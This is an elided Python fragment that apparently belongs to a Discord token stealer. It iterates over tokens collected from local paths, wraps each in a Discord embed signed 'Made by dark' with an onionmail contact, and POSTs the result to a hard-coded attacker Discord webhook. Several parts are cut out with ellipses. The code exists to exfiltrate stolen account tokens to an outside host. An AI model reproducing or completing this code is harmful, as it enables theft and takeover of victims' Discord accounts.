        ...
        for token in gettokens(path):
            ...
            try:
                ...
                embed_user = {
                    'embeds': [
                        {
                            ...
                            'color': 3092790,
                            'footer': {
                                'text': "Made by dark ・ nex@onionmail.org"
                            },
                            'thumbnail': {
                    ...
                    "username": "Dark-list",
                    "avatar_url": "https://discord.com/api/webhooks/1351837277944414249/sgb-KukBnZwiyZve9Oj3EePr28REC6CSQf1fWcK-yQCHYthtd8HwDoKHQRG_hqTIq02U"
                }

                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1351743628611031122/d2VT5J4oAS5ulpf3tsxkxvQUvhJ2SRqV_TlToZ5nqMGL_z1YpSuURXuHblCeYalkW4Fb', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
